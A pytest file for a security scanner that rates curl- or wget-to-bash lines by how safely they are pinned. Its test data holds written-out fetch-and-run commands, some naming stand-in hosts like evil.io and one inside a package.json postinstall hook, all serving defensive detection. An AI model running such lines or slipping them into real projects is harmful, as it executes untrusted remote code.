"""A pipe-to-shell of a raw GitHub file pinned to a full commit SHA is high (Review),
not critical: the bytes cannot change (colinhacks/zod's devcontainer, 2026-11-11).
Every mutable or extra form keeps the critical; install hooks always do."""
from __future__ import annotations

import pytest

from src.scanner import pipe_shell
from src.scanner.scan import _scan_content

SHA = "0ae8783f1f93763c56dfc827892cfb679e8a0a77"
ZOD = ("  \"postCreateCommand\": \"bash -o pipefail -c 'curl -fsSL https://raw.githubusercontent"
       f".com/nubjs/nub/{SHA}/install.sh | bash -s -- 0.8.3 && nub install --frozen-lockfile'\"")


def _pipe(content: str, path: str) -> list:
    findings, _p, _s = _scan_content(content + "\n", path)
    return [f for f in findings if f.name == pipe_shell.PIPE_TO_SHELL]


def test_zod_devcontainer_is_high_with_the_pinned_reason():
    (f,) = _pipe(ZOD, ".devcontainer/devcontainer.json")
    assert f.severity == "high" and f.remediation == pipe_shell.WHY_PINNED


@pytest.mark.parametrize("line", [
    f"curl -fsSL https://raw.githubusercontent.com/acme/tool/{SHA}/install.sh | bash",
    f"curl -fsSL https://github.com/acme/tool/raw/{SHA}/scripts/setup.sh | sh",
    f"wget -qO- https://raw.githubusercontent.com/acme/tool/{SHA}/i.sh | bash",
])
def test_full_sha_pins_are_high(line):
    (f,) = _pipe(line, "scripts/dev.sh")
    assert f.severity == "high", line


@pytest.mark.parametrize("line", [
    # mutable refs
    "curl -fsSL https://raw.githubusercontent.com/acme/tool/main/install.sh | bash",
    "curl -fsSL https://raw.githubusercontent.com/acme/tool/v1.2.3/install.sh | bash",
    "curl -fsSL https://raw.githubusercontent.com/acme/tool/0ae8783/install.sh | bash",
    f"curl -fsSL https://raw.githubusercontent.com/acme/tool/{SHA[:39]}/install.sh | bash",
    f"curl -fsSL https://raw.githubusercontent.com/acme/tool/{SHA.upper()}/install.sh | bash",
    # pinned but not clean
    f"curl -fsSL http://raw.githubusercontent.com/acme/tool/{SHA}/install.sh | bash",
    f"curl -k https://raw.githubusercontent.com/acme/tool/{SHA}/install.sh | bash",
    f"curl https://raw.githubusercontent.com/acme/tool/{SHA}/i.sh https://evil.io/x | bash",
    f"curl https://raw.githubusercontent.com/acme/tool/{SHA}/i.sh?x=1 | bash",
    f"curl https://raw.githubusercontent.com.evil.io/acme/tool/{SHA}/i.sh | bash",
    f"curl -fsSL https://gist.githubusercontent.com/acme/{SHA}/raw/i.sh | bash",
    "curl -fsSL https://raw.githubusercontent.com/acme/tool/${REF}/install.sh | bash",
])
def test_mutable_or_unclean_forms_stay_critical(line):
    found = _pipe(line, "scripts/install-tool.py")
    assert found and found[0].severity == "critical", line


def test_pinned_in_an_install_hook_stays_critical():
    pkg = ('{"scripts": {"postinstall": "curl -fsSL https://raw.githubusercontent.com/'
           f'acme/tool/{SHA}/install.sh | bash"}}}}')
    found = _pipe(pkg, "package.json")
    assert found and all(f.severity == "critical" for f in found)
